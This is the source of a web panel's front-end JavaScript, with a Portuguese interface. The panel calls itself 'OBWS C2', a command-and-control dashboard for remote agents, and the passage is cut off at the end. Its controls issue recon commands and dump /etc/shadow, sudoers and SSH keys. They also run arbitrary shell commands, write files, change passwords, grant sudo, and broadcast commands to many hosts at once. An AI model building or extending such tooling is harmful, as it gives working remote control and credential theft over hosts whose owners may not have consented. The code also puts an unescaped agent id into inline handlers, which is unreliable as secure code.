const App = {
  currentPage: 'dashboard',
  currentAgent: null,
  refreshTimers: [],

  init() {
    this.loadPage('dashboard');
    this.bindNavigation();
    this.bindModal();
    this.bindClickOutside();
  },

  bindNavigation() {
    document.querySelector('.sidebar').addEventListener('click', e => {
      const link = e.target.closest('[data-page]');
      if (link) {
        e.preventDefault();
        this.loadPage(link.dataset.page);
        document.querySelectorAll('.sidebar-link').forEach(l => l.classList.remove('active'));
        link.classList.add('active');
        this.closeDropdown();
      }
    });
  },

  bindModal() {
    document.getElementById('confirm-modal').addEventListener('click', e => {
      if (e.target === e.currentTarget) this.closeModal();
    });
    document.addEventListener('keydown', e => {
      if (e.key === 'Escape') this.closeModal();
    });
  },

  bindClickOutside() {
    document.addEventListener('click', e => {
      const dd = document.getElementById('user-dropdown');
      if (dd && !dd.contains(e.target)) this.closeDropdown();
    });
  },

  toggleDropdown() {
    document.getElementById('user-dropdown').classList.toggle('active');
  },

  closeDropdown() {
    document.getElementById('user-dropdown').classList.remove('active');
  },

  api(action, params = {}) {
    const qs = Object.entries(params).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join('&');
    return fetch(`?page=api&action=${action}${qs ? '&' + qs : ''}`)
      .then(r => r.json()).catch(() => null);
  },

  apiPost(action, data) {
    return fetch(`?page=api&action=${action}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    }).then(r => r.json()).catch(() => null);
  },

  loadPage(page) {
    this.clearTimers();
    this.currentPage = page;
    this.closeDropdown();
    const cta = document.querySelector('.content-area');
    if (cta) cta.scrollTop = 0;
    const pages = {
      dashboard: () => this.renderDashboard(),
      agent: () => this.renderAgent(this.currentAgent),
      hosts: () => this.renderHosts(),
      endpoints: () => this.renderHosts(),
      commands: () => this.renderCommands(),
      broadcast: () => this.renderBroadcast(),
      profile: () => this.renderProfile(),
      preferences: () => this.renderPreferences(),
      'change-password': () => this.renderChangePassword(),
      about: () => this.renderAbout(),
    };
    (pages[page] || this.renderDashboard)();
  },

  clearTimers() {
    this.refreshTimers.forEach(t => clearInterval(t));
    this.refreshTimers = [];
  },

  startTimer(fn, ms) {
    fn();
    const id = setInterval(fn, ms);
    this.refreshTimers.push(id);
  },

  escape(s) {
    if (s === null || s === undefined) return '-';
    const d = document.createElement('div');
    d.textContent = String(s);
    return d.innerHTML;
  },

  fmtMem(mb) {
    if (!mb) return '0 MB';
    return mb >= 1024 ? (mb / 1024).toFixed(1) + ' GB' : mb + ' MB';
  },

  pretty(s) {
    try { return JSON.stringify(JSON.parse(s), null, 2); } catch (_) { return s; }
  },

  // ======================== DASHBOARD ========================
  async renderDashboard() {
    const el = document.getElementById('app-content');
    el.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
    const [agents, stats] = await Promise.all([
      this.api('agents'),
      this.api('stats')
    ]);
    const agentCount = (agents || []).length;
    const s = stats || {};
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Dashboard</h2>
        <span class="live-badge"><span class="live-dot"></span> Tempo real</span>
      </div>
      <div class="stat-row">
        <div class="stat-block">
          <div class="stat-block-num">${s.agents_online||0}</div>
          <div class="stat-block-label">Online</div>
        </div>
        <div class="stat-block">
          <div class="stat-block-num">${agentCount}</div>
          <div class="stat-block-label">Total de Hosts</div>
        </div>
        <div class="stat-block">
          <div class="stat-block-num ${(s.commands_pending||0) > 0 ? 'num-warn' : ''}">${s.commands_pending||0}</div>
          <div class="stat-block-label">Comandos Pendentes</div>
        </div>
        <div class="stat-block">
          <div class="stat-block-num">${s.commands_total||0}</div>
          <div class="stat-block-label">Comandos Executados</div>
        </div>
      </div>
      <div class="section">
        <h3 class="section-title">Agentes</h3>
        ${this.renderAgentList(agents || [])}
      </div>
    `;
    this.startTimer(() => this.refreshDashboard(), 10000);
  },

  async refreshDashboard() {
    const [agents, stats] = await Promise.all([
      this.api('agents'),
      this.api('stats')
    ]);
    const nums = document.querySelectorAll('.stat-block-num');
    const s = stats || {};
    if (nums[0]) nums[0].textContent = s.agents_online || 0;
    if (nums[1]) nums[1].textContent = agents ? agents.length : 0;
    if (nums[2]) { const pc = s.commands_pending || 0; nums[2].textContent = pc; nums[2].classList.toggle('num-warn', pc > 0); }
    if (nums[3]) nums[3].textContent = s.commands_total || 0;
    const list = document.querySelector('.agent-list');
    if (list) {
      const temp = document.createElement('div');
      temp.innerHTML = this.renderAgentList(agents || []);
      const nl = temp.querySelector('.agent-list');
      if (nl) list.replaceWith(nl);
    }
  },

  renderAgentList(agents) {
    if (!agents.length) {
      return `<div class="empty"><p>Nenhum agente registrado. Aguarde o primeiro push de telemetria.</p></div>`;
    }
    return `<div class="agent-list">${
      agents.map(a => `
        <div class="agent-row" onclick="App.loadAgent('${this.escape(a.agent_id)}')">
          <div class="agent-row-body">
            <div class="agent-row-name">${this.escape(a.hostname)} <span class="id-trunc">${this.escape(a.agent_id).slice(0,8)}</span></div>
            <div class="agent-row-meta">${this.escape(a.os)}<span class="msep">|</span>${a.cpu_cores} cores<span class="msep">|</span>${this.fmtMem(a.mem_mb)}<span class="msep">|</span>${this.escape(a.last_ip)}</div>
          </div>
          <button class="btn btn-primary btn-sm">Gerenciar</button>
        </div>`
      ).join('')
    }</div>`;
  },

  loadAgent(id) {
    this.currentAgent = id;
    this.loadPage('agent');
  },

  // ======================== AGENT DETAIL ========================
  async renderAgent(id) {
    const el = document.getElementById('app-content');
    el.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
    const [agent, telemetry, commands] = await Promise.all([
      this.api('agent', { id }),
      this.api('telemetry', { id }),
      this.api('agent_commands', { id })
    ]);
    if (!agent) {
      el.innerHTML = '<div class="empty"><p>Agente nao encontrado.</p></div>';
      return;
    }
    const pendCount = (commands || []).filter(c => c.status === 'pending').length;
    el.innerHTML = `
      <div class="page-head">
        <div>
          <a class="back" onclick="App.loadPage('dashboard');return false"><i class="fa-solid fa-arrow-left"></i> Dashboard</a>
          <h2 class="page-title" style="margin-top:4px">${this.escape(agent.hostname)}</h2>
          <div class="agent-meta-line">
            <code>${this.escape(agent.agent_id)}</code>
            ${pendCount > 0 ? `<span class="badge badge-pending">${pendCount} pendente(s)</span>` : ''}
            <span class="live-badge"><span class="live-dot"></span> Online</span>
          </div>
        </div>
      </div>

      <div class="card-grid">
        ${this.cInfo('SO', agent.os)}
        ${this.cInfo('Kernel', agent.kernel)}
        ${this.cInfo('CPU', agent.cpu_cores + ' nucleos')}
        ${this.cInfo('RAM', this.fmtMem(agent.mem_mb))}
        ${this.cInfo('Disco', agent.disk)}
        ${this.cInfo('IP', agent.last_ip)}
        ${this.cInfo('Ultimo Contato', agent.last_seen)}
      </div>

      <div class="section">
        <h3 class="section-title">C2 Actions</h3>
        <div class="cmd-panel">
          <div class="cmd-panel-section open">
            <div class="cmd-panel-header" onclick="this.parentElement.classList.toggle('open')">
              <i class="fa-solid fa-magnifying-glass"></i> Reconhecimento
              <i class="fa-solid fa-chevron-down cmd-chevron"></i>
            </div>
            <div class="cmd-panel-body">
              <div class="action-bar">${[
                ['whoami','Whoami','fa-user'],
                ['id','ID','fa-id-card'],
                ['hostname','Hostname','fa-sitemap'],
                ['uname','Kernel','fa-microchip'],
                ['uptime','Uptime','fa-clock'],
                ['date','Data UTC','fa-calendar'],
                ['last','Logins','fa-right-to-bracket'],
                ['os_release','OS Release','fa-file'],
                ['env','Env Vars','fa-gear'],
              ].map(a => this.btnTpl(id, a[0], a[1], a[2], 'primary')).join('')}</div>
            </div>
          </div>
          <div class="cmd-panel-section">
            <div class="cmd-panel-header" onclick="this.parentElement.classList.toggle('open')">
              <i class="fa-solid fa-list"></i> Processos
              <i class="fa-solid fa-chevron-down cmd-chevron"></i>
            </div>
            <div class="cmd-panel-body">
              <div class="action-bar">${[
                ['ps','Listar Processos','fa-list'],
                ['ps_tree','Arvore','fa-sitemap'],
                ['top','Top 40','fa-chart-simple'],
                ['proc_roots','Binarios /proc','fa-file'],
              ].map(a => this.btnTpl(id, a[0], a[1], a[2], 'primary')).join('')}</div>
            </div>
          </div>
          <div class="cmd-panel-section">
            <div class="cmd-panel-header" onclick="this.parentElement.classList.toggle('open')">
              <i class="fa-solid fa-network-wired"></i> Rede
              <i class="fa-solid fa-chevron-down cmd-chevron"></i>
            </div>
            <div class="cmd-panel-body">
              <div class="action-bar">${[
                ['ip','IP Addr','fa-network-wired'],
                ['netstat','Portas','fa-plug'],
                ['routes','Rotas','fa-route'],
                ['arp','ARP','fa-diagram-project'],
                ['connections','Conexoes','fa-right-left'],
                ['dns','DNS','fa-globe'],
                ['iptables','Firewall','fa-shield'],
              ].map(a => this.btnTpl(id, a[0], a[1], a[2], 'primary')).join('')}</div>
            </div>
          </div>
          <div class="cmd-panel-section">
            <div class="cmd-panel-header" onclick="this.parentElement.classList.toggle('open')">
              <i class="fa-solid fa-hard-drive"></i> Arquivos e Discos
              <i class="fa-solid fa-chevron-down cmd-chevron"></i>
            </div>
            <div class="cmd-panel-body">
              <div class="action-bar">${[
                ['df','Disco','fa-hard-drive'],
                ['mount','Montagens','fa-box'],
                ['ls_root','/root/','fa-folder'],
                ['ls_tmp','/tmp/','fa-folder'],
                ['ls_etc','/etc/','fa-folder'],
                ['ls_var_log','/var/log/','fa-folder'],
                ['ls_home','/home/','fa-folder'],
                ['find_suid','SUID','fa-shield'],
                ['disk_usage','Uso por dir','fa-chart-pie'],
              ].map(a => this.btnTpl(id, a[0], a[1], a[2], 'primary')).join('')}</div>
              <hr class="cmd-sep">
              <form onsubmit="App.sendCommand(event,'${id}','cat_file',document.getElementById('cat-in-${id}').value)">
                <div class="cmd-form"><input type="text" id="cat-in-${id}" placeholder="caminho do arquivo" required><button type="submit" class="btn btn-primary">Ler Arquivo</button></div>
              </form>
              <form onsubmit="App.sendCommand(event,'${id}','exec','find / -type f -name \\"' + document.getElementById('find-in-${id}').value + '\\" 2>/dev/null | head -30')">
                <div class="cmd-form"><input type="text" id="find-in-${id}" placeholder="nome do arquivo (find)" required><button type="submit" class="btn btn-primary">Buscar</button></div>
              </form>
              <form onsubmit="App.sendCommand(event,'${id}','write_file',document.getElementById('wf-path-${id}').value+' '+document.getElementById('wf-content-${id}').value)">
                <div class="cmd-form"><input type="text" id="wf-path-${id}" placeholder="caminho destino" required style="flex:0 0 160px"><input type="text" id="wf-content-${id}" placeholder="conteudo" required><button type="submit" class="btn btn-warning">Escrever</button></div>
              </form>
            </div>
          </div>
          <div class="cmd-panel-section">
            <div class="cmd-panel-header" onclick="this.parentElement.classList.toggle('open')">
              <i class="fa-solid fa-lock"></i> Credenciais e Acesso
              <i class="fa-solid fa-chevron-down cmd-chevron"></i>
            </div>
            <div class="cmd-panel-body">
              <div class="action-bar">${[
                ['passwd','Usuarios','fa-users'],
                ['shadow','Shadow','fa-key'],
                ['sudoers','Sudoers','fa-shield'],
                ['ssh_keys','SSH Keys','fa-key'],
                ['lastlog','Lastlog','fa-clock'],
                ['packages','Pacotes','fa-box'],
                ['services','Servicos','fa-gear'],
                ['crontab','Crontab','fa-clock'],
                ['docker_ps','Docker','fa-cubes'],
              ].map(a => this.btnTpl(id, a[0], a[1], a[2], 'primary')).join('')}</div>
            </div>
          </div>
          <div class="cmd-panel-section">
            <div class="cmd-panel-header" onclick="this.parentElement.classList.toggle('open')">
              <i class="fa-solid fa-screwdriver-wrench"></i> Administracao
              <i class="fa-solid fa-chevron-down cmd-chevron"></i>
            </div>
            <div class="cmd-panel-body">
              <div class="action-bar">${[
                ['collect','Coletar Telemetria','fa-download',false],
                ['reboot','Reiniciar','fa-rotate',true],
                ['poweroff','Desligar','fa-power-off',true],
              ].map(a => this.btnAcao(a[0], a[1], a[2], 'primary', a[3])).join('')}
              <button class="btn btn-danger" onclick="App.confirm('Remover Host','Tem certeza que deseja remover <b>permanentemente</b> este host e todos os seus dados?',()=>App.deleteAgent('${id}'))"><i class="fa-solid fa-trash-can"></i> Remover Host</button></div>
              <hr class="cmd-sep">
              <form onsubmit="App.sendCommand(event, '${id}', 'exec', document.getElementById('exec-in-${id}').value)">
                <div class="cmd-form"><input type="text" id="exec-in-${id}" placeholder="comando a executar" required><button type="submit" class="btn btn-primary">Executar</button></div>
              </form>
              <hr class="cmd-sep">
              <form onsubmit="App.sendCommand(event,'${id}','change_password',document.getElementById('cp-u-${id}').value+' '+document.getElementById('cp-p-${id}').value)">
                <div class="cmd-form"><input type="text" id="cp-u-${id}" placeholder="usuario" required><input type="password" id="cp-p-${id}" placeholder="nova senha" required><button type="submit" class="btn btn-warning">Alterar Senha</button></div>
              </form>
              <form onsubmit="App.sendCommand(event,'${id}','remove_user',document.getElementById('ru-u-${id}').value)">
                <div class="cmd-form"><input type="text" id="ru-u-${id}" placeholder="usuario" required><button type="submit" class="btn btn-danger">Remover Usuario</button></div>
              </form>
              <form onsubmit="App.sendCommand(event,'${id}','add_sudo',document.getElementById('as-u-${id}').value)">
                <div class="cmd-form"><input type="text" id="as-u-${id}" placeholder="usuario" required><button type="submit" class="btn btn-success">Adicionar Sudo</button></div>
              </form>
            </div>
          </div>
        </div>
      </div>

      <div class="section">
        <h3 class="section-title">Historico de Comandos</h3>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>ID</th><th>Acao</th><th>Parametros</th><th>Status</th><th>Resultado</th><th>Criado</th><th>Concluido</th></tr></thead><tbody id="commands-section">${
          (commands || []).map(c => this.cmdRow(c)).join('')
        }</tbody></table></div>
      </div>

      <div class="section">
        <h3 class="section-title">Telemetrias</h3>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>ID</th><th>Timestamp</th><th>Payload</th></tr></thead><tbody id="telemetry-section">${
          (telemetry || []).map(t => this.telRow(t)).join('')
        }</tbody></table></div>
      </div>
    `;
    this.startTimer(() => this.refreshAgent(id), 15000);
  },

  // template-based command button
  btnTpl(agentId, action, label, icon, style) {
    return `<button class="btn btn-${style}" onclick="App.sendTplCommand(event,'${agentId}','${action}')"><i class="fa-solid ${icon}"></i> ${label}</button>`;
  },

  // ======================== RENDER HELPERS ========================
  cInfo(label, value) {
    return `<div class="c-info"><span class="c-info-label">${label}</span><span class="c-info-val">${this.escape(value)}</span></div>`;
  },

  btnAcao(action, label, icon, style, needsConfirm) {
    const onclick = needsConfirm
      ? `App.confirm('${label}','Tem certeza que deseja <b>${label.toLowerCase()}</b> este agente?',()=>App.sendCommand(null,'${this.currentAgent}','${action}',''))`
      : `App.sendTplCommand(null,'${this.currentAgent}','${action}')`;
    return `<button class="btn btn-${style}" onclick="${onclick}"><i class="fa-solid ${icon}"></i> ${label}</button>`;
  },

  cmdRow(c) {
    return `<tr><td class="c-id">#${c.id}</td><td><code>${this.escape(c.action)}</code></td><td class="c-p">${this.escape(c.params) || '-'}</td><td>${this.badge(c.status)}</td><td class="c-r">${this.escape((c.result||'').slice(0,80)) || '-'}</td><td class="c-d">${this.escape(c.created_at)}</td><td class="c-d">${this.escape(c.completed_at) || '-'}</td></tr>`;
  },

  telRow(t) {
    return `<tr><td class="c-id">#${t.id}</td><td class="c-d">${this.escape(t.received_at)}</td><td class="c-payload"><pre>${this.escape(this.pretty(t.payload))}</pre></td></tr>`;
  },

  badge(st) {
    const m = { pending: '<span class="badge badge-pending">Pendente</span>', sent: '<span class="badge badge-sent">Enviado</span>', completed: '<span class="badge badge-success">Concluido</span>', failed: '<span class="badge badge-error">Falhou</span>', cancelled: '<span class="badge badge-error">Cancelado</span>' };
    return m[st] || `<span class="badge">${this.escape(st)}</span>`;
  },

  // ======================== COMMANDS ========================
  async sendCommand(event, agentId, action, params) {
    if (event) event.preventDefault();
    let btn = null;
    if (event) {
      const f = event.target;
      btn = f.querySelector('button[type="submit"]');
    }
    if (btn) { btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>'; }
    const result = await this.apiPost('command', { agent_id: agentId, action, params });
    if (btn) { btn.disabled = false; btn.textContent = action === 'exec' ? 'Executar' : action; }
    if (result && result.command_id) {
      this.showToast('Comando enviado', 'ok');
      if (agentId === this.currentAgent) this.refreshAgent(agentId);
    } else {
      this.showToast('Erro ao enviar comando', 'err');
    }
  },

  async sendTplCommand(event, agentId, action) {
    if (event && event.preventDefault) event.preventDefault();
    const result = await this.apiPost('command', { agent_id: agentId, action, params: '__template__' });
    if (result && result.command_id) {
      this.showToast('Comando enviado', 'ok');
      if (agentId === this.currentAgent) this.refreshAgent(agentId);
    } else {
      this.showToast('Erro ao enviar comando', 'err');
    }
  },

  async refreshAgent(agentId) {
    const [commands, telemetry] = await Promise.all([
      this.api('agent_commands', { id: agentId }),
      this.api('telemetry', { id: agentId })
    ]);
    const cmdBody = document.getElementById('commands-section');
    const telBody = document.getElementById('telemetry-section');
    if (cmdBody) cmdBody.innerHTML = (commands || []).map(c => this.cmdRow(c)).join('');
    if (telBody) telBody.innerHTML = (telemetry || []).map(t => this.telRow(t)).join('');
    const pc = (commands || []).filter(c => c.status === 'pending').length;
    const badge = document.querySelector('.badge-pending');
    if (badge) {
      if (pc > 0) badge.textContent = pc + ' pendente(s)';
      else badge.remove();
    }
  },

  // ======================== HOSTS / ENDPOINTS ========================
  async renderHosts() {
    const el = document.getElementById('app-content');
    el.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
    const agents = await this.api('agents');
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Hosts</h2>
        <span class="live-badge"><span class="live-dot"></span> ${(agents||[]).length} registrados</span>
      </div>
      <div class="endpoint-grid">
        ${(agents||[]).map(a => `
          <div class="endpoint-card" onclick="App.loadAgent('${this.escape(a.agent_id)}')">
            <div class="endpoint-card-name">
              <span class="endpoint-card-status online"></span>
              ${this.escape(a.hostname)}
            </div>
            <div class="endpoint-card-meta">${this.escape(a.os)} &middot; ${a.cpu_cores} cores &middot; ${this.fmtMem(a.mem_mb)}</div>
            <div class="endpoint-card-meta" style="margin-top:4px"><code>${this.escape(a.agent_id).slice(0,16)}</code></div>
          </div>
        `).join('')}
      </div>
      ${(agents||[]).length === 0 ? '<div class="empty"><p>Nenhum host registrado.</p></div>' : ''}
    `;
  },

  // ======================== COMMANDS PAGE (C2) ========================
  async renderCommands() {
    const el = document.getElementById('app-content');
    el.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
    const cmds = await this.api('commands');
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Comandos</h2>
        <span class="live-badge"><span class="live-dot"></span> ${(cmds||[]).length} registros</span>
      </div>
      <div class="filter-bar">
        <select id="cmd-filter-status" onchange="App.filterCommands()">
          <option value="">Todos Status</option>
          <option value="pending">Pendentes</option>
          <option value="sent">Enviados</option>
          <option value="completed">Concluidos</option>
          <option value="failed">Falhos</option>
          <option value="cancelled">Cancelados</option>
        </select>
        <input type="text" id="cmd-filter-search" placeholder="buscar acao ou agente..." oninput="App.filterCommands()">
        <button class="btn btn-sm" onclick="App.loadPage('commands')"><i class="fa-solid fa-rotate"></i> Atualizar</button>
      </div>
      <div class="command-list" id="cmd-list">
        ${this.renderCmdItems(cmds || [])}
      </div>
      ${(cmds||[]).length === 0 ? '<div class="empty"><p>Nenhum comando registrado.</p></div>' : ''}
    `;
    this.startTimer(() => this.refreshCmds(), 15000);
  },

  renderCmdItems(cmds) {
    return cmds.map(c => `
      <div class="cmd-item">
        <div class="cmd-item-icon ${c.status}">
          <i class="fa-solid ${c.status === 'completed' ? 'fa-check' : c.status === 'failed' || c.status === 'cancelled' ? 'fa-xmark' : c.status === 'sent' ? 'fa-paper-plane' : 'fa-clock'}"></i>
        </div>
        <div class="cmd-item-body">
          <div class="cmd-item-action"><code>${this.escape(c.action)}</code> ${this.escape(c.params) ? '&mdash; ' + this.escape(c.params).slice(0, 40) : ''}</div>
          <div class="cmd-item-meta">#${c.id} &middot; ${this.escape(c.agent_id).slice(0,12)} &middot; ${this.badge(c.status)}</div>
        </div>
        <div class="cmd-item-actions">
          ${c.status === 'pending' ? `<button class="btn btn-sm" onclick="App.cancelCmd(${c.id})" title="Cancelar"><i class="fa-solid fa-ban"></i></button>` : ''}
          ${c.status === 'failed' || c.status === 'cancelled' ? `<button class="btn btn-sm" onclick="App.retryCmd(${c.id})" title="Reenviar"><i class="fa-solid fa-rotate"></i></button>` : ''}
        </div>
      </div>
    `).join('');
  },

  filterCommands() {
    const status = document.getElementById('cmd-filter-status').value;
    const search = document.getElementById('cmd-filter-search').value.toLowerCase();
    this.api('commands', { status }).then(cmds => {
      const filtered = (cmds || []).filter(c =>
        !search || c.action.toLowerCase().includes(search) || c.agent_id.toLowerCase().includes(search)
      );
      const list = document.getElementById('cmd-list');
      if (list) list.innerHTML = this.renderCmdItems(filtered);
    });
  },

  async refreshCmds() {
    const cmds = await this.api('commands');
    const list = document.getElementById('cmd-list');
    if (list) list.innerHTML = this.renderCmdItems(cmds || []);
  },

  async cancelCmd(id) {
    const result = await this.apiPost('cancel_command', { id });
    if (result && result.status === 'ok') {
      this.showToast('Comando cancelado', 'ok');
      this.refreshCmds();
    } else {
      this.showToast('Erro ao cancelar', 'err');
    }
  },

  async retryCmd(id) {
    const result = await this.apiPost('retry_command', { id });
    if (result && result.status === 'ok') {
      this.showToast('Comando reenviado', 'ok');
      this.refreshCmds();
    } else {
      this.showToast('Erro ao reenviar', 'err');
    }
  },

  // ======================== BROADCAST ========================
  async renderBroadcast() {
    const el = document.getElementById('app-content');
    el.innerHTML = '<div class="loading"><div class="spinner"></div></div>';
    const agents = await this.api('agents');
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Broadcast</h2>
      </div>
      <div class="broadcast-form">
        <h3 class="section-title">Enviar Comando para Multiplos Hosts</h3>
        <div class="hosts-checklist" id="hosts-checklist">
          ${(agents||[]).map(a => `
            <label class="host-check">
              <input type="checkbox" class="host-cb" value="${this.escape(a.agent_id)}">
              <span class="host-check-label">${this.escape(a.hostname)}</span>
              <span class="host-check-meta">${this.escape(a.os)}</span>
            </label>
          `).join('')}
        </div>
        ${(agents||[]).length === 0 ? '<div class="empty"><p>Nenhum host disponivel.</p></div>' : ''}
        <div class="cmd-form" style="margin-top:12px">
            <select id="bc-template" onchange="App.loadBCTemplate()" style="background:#1b2a32;border:1px solid #21333b;border-radius:3px;padding:7px 10px;color:#eaedf0;font-size:.82em;font-family:inherit">
              <option value="">Template rapido...</option>
              <option value="whoami">whoami</option>
              <option value="id">id</option>
              <option value="ip">ip a</option>
              <option value="ps">ps aux</option>
              <option value="netstat">ss -tulpn</option>
              <option value="uptime">uptime</option>
              <option value="df">df -h</option>
              <option value="uname">uname -a</option>
              <option value="hostname">hostname</option>
              <option value="passwd">usuarios</option>
              <option value="sudoers">sudoers</option>
              <option value="ssh_keys">ssh keys</option>
              <option value="services">servicos</option>
              <option value="crontab">crontab</option>
              <option value="last">ultimos logins</option>
              <option value="connections">conexoes ativas</option>
              <option value="collect">forcar telemetria</option>
            </select>
          <input type="text" id="bc-action" placeholder="acao (ex: exec)" value="exec" style="background:#1b2a32;border:1px solid #21333b;border-radius:3px;padding:7px 10px;color:#eaedf0;font-size:.82em;font-family:inherit;flex:0 0 120px">
          <input type="text" id="bc-params" placeholder="comando ou parametros" style="background:#1b2a32;border:1px solid #21333b;border-radius:3px;padding:7px 10px;color:#eaedf0;font-size:.82em;font-family:inherit;flex:1;min-width:120px">
          <button class="btn btn-primary" onclick="App.sendBroadcast()"><i class="fa-solid fa-bullhorn"></i> Enviar</button>
          <button class="btn" onclick="App.toggleAllHosts()"><i class="fa-regular fa-square-check"></i> Todos</button>
        </div>
      </div>
    `;
  },

  loadBCTemplate() {
    const sel = document.getElementById('bc-template');
    if (sel.value) {
      document.getElementById('bc-action').value = sel.value;
      document.getElementById('bc-params').value = '';
    }
  },

  toggleAllHosts() {
    const cbs = document.querySelectorAll('.host-cb');
    const allChecked = Array.from(cbs).every(cb => cb.checked);
    cbs.forEach(cb => cb.checked = !allChecked);
  },

  async sendBroadcast() {
    const cbs = document.querySelectorAll('.host-cb:checked');
    const agent_ids = Array.from(cbs).map(cb => cb.value);
    if (!agent_ids.length) {
      this.showToast('Selecione ao menos um host', 'err');
      return;
    }
    const action = document.getElementById('bc-action').value.trim();
    const params = document.getElementById('bc-params').value.trim();
    if (!action) {
      this.showToast('Informe a acao', 'err');
      return;
    }
    const btn = document.querySelector('.broadcast-form .btn-primary');
    btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
    const result = await this.apiPost('bulk_command', { agent_ids, action, params: params || '__template__' });
    btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-bullhorn"></i> Enviar';
    if (result && result.status === 'ok') {
      this.showToast(`${result.created} comando(s) enviado(s) para ${result.total} host(s)`, 'ok');
    } else {
      this.showToast('Erro ao enviar broadcast', 'err');
    }
  },

  // ======================== PROFILE ========================
  renderProfile() {
    const el = document.getElementById('app-content');
    const userSpan = document.querySelector('.header-user span');
    const username = userSpan ? userSpan.textContent : 'admin';
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Perfil</h2>
      </div>
      <div class="profile-card">
        <div class="profile-avatar"><i class="fa-regular fa-user"></i></div>
        <div class="profile-name">${this.escape(username)}</div>
        <div class="profile-role">Administrador do Sistema</div>
        <div class="profile-info">
          <div class="profile-field"><span class="profile-field-label">Usuario</span><span class="profile-field-value">${this.escape(username)}</span></div>
          <div class="profile-field"><span class="profile-field-label">Painel</span><span class="profile-field-value">OBWS C2</span></div>
          <div class="profile-field"><span class="profile-field-label">Autenticacao</span><span class="profile-field-value">SQLite / BCrypt</span></div>
        </div>
      </div>
    `;
  },

  // ======================== DELETE AGENT ========================
  async deleteAgent(agentId) {
    const el = document.getElementById('app-content');
    if (!el) return;
    const result = await this.apiPost('delete_agent', { id: agentId });
    if (result && result.status === 'ok') {
      this.showToast('Host removido com sucesso', 'success');
      this.loadPage('dashboard');
    } else {
      this.showToast('Erro ao remover host', 'error');
    }
  },

  // ======================== PREFERENCES ========================
  renderPreferences() {
    const el = document.getElementById('app-content');
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Preferencias</h2>
      </div>
      <div class="broadcast-form" style="max-width:500px">
        <div class="cmd-form">
          <span style="color:#acbac3;font-size:.85em;flex:1">Tema escuro (Harbor)</span>
          <span class="badge badge-success">Ativo</span>
        </div>
        <div class="cmd-form" style="margin-top:12px">
          <span style="color:#acbac3;font-size:.85em;flex:1">Auto-atualizar dashboard</span>
          <span class="badge badge-success">10s</span>
        </div>
        <div class="cmd-form" style="margin-top:12px">
          <span style="color:#acbac3;font-size:.85em;flex:1">Auto-atualizar detalhes</span>
          <span class="badge badge-success">15s</span>
        </div>
      </div>
    `;
  },

  // ======================== CHANGE PASSWORD ========================
  renderChangePassword() {
    const el = document.getElementById('app-content');
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Alterar Senha</h2>
      </div>
      <div class="pw-form">
        <form onsubmit="App.changePw(event)">
          <div class="cmd-form" style="margin-bottom:16px">
            <input type="password" id="pw-current" placeholder="senha atual" required>
          </div>
          <div class="cmd-form" style="margin-bottom:16px">
            <input type="password" id="pw-new" placeholder="nova senha" required minlength="6">
          </div>
          <div class="cmd-form" style="margin-bottom:16px">
            <input type="password" id="pw-confirm" placeholder="confirmar nova senha" required>
          </div>
          <button type="submit" class="btn btn-primary" id="pw-btn">Alterar Senha</button>
        </form>
      </div>
    `;
  },

  async changePw(event) {
    event.preventDefault();
    const current = document.getElementById('pw-current').value;
    const pw = document.getElementById('pw-new').value;
    const confirm = document.getElementById('pw-confirm').value;
    if (pw !== confirm) {
      this.showToast('Senhas nao conferem', 'err');
      return;
    }
    if (pw.length < 6) {
      this.showToast('Minimo 6 caracteres', 'err');
      return;
    }
    const btn = document.getElementById('pw-btn');
    btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
    // Hash the password (simple client-side hash for transport; real bcrypt on server)
    const hash = await this.simpleHash(pw);
    const userSpan = document.querySelector('.header-user span');
    const username = userSpan ? userSpan.textContent : 'admin';
    const result = await this.apiPost('profile', { action: 'change_password', data: username + ':' + hash });
    btn.disabled = false; btn.textContent = 'Alterar Senha';
    if (result && result.status === 'ok') {
      this.showToast('Senha alterada com sucesso', 'ok');
    } else {
      this.showToast('Erro ao alterar senha', 'err');
    }
  },

  async simpleHash(str) {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return 'sha256$' + Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('');
  },

  // ======================== ABOUT ========================
  async renderAbout() {
    const el = document.getElementById('app-content');
    const stats = await this.api('stats');
    const s = stats || {};
    el.innerHTML = `
      <div class="page-head">
        <h2 class="page-title">Sobre</h2>
      </div>
      <div class="about-card">
        <div class="about-logo"><i class="fa-solid fa-server"></i></div>
        <h2>OBWS</h2>
        <div class="about-version">Command &amp; Control v2.0</div>
        <div class="about-desc">
          OBWS e um sistema de gerenciamento remoto de servidores com arquitetura C2 (Command &amp; Control).
          Utiliza criptografia X25519 + NaCl box para comunicacao segura com agentes remotos.
        </div>
        <div class="about-stats">
          <div class="about-stat"><div class="about-stat-num">${s.agents_total||0}</div><div class="about-stat-label">Agentes</div></div>
          <div class="about-stat"><div class="about-stat-num">${s.agents_online||0}</div><div class="about-stat-label">Online</div></div>
          <div class="about-stat"><div class="about-stat-num">${s.commands_total||0}</div><div class="about-stat-label">Comandos</div></div>
          <div class="about-stat"><div class="about-stat-num">${s.telemetry_total||0}</div><div class="about-stat-label">Telemetrias</div></div>
        </div>
      </div>
    `;
  },

  // ======================== MODAL ========================
  confirm(title, msg, fn) {
    document.getElementById('modal-title').textContent = title;
    document.getElementById('modal-body').innerHTML = msg;
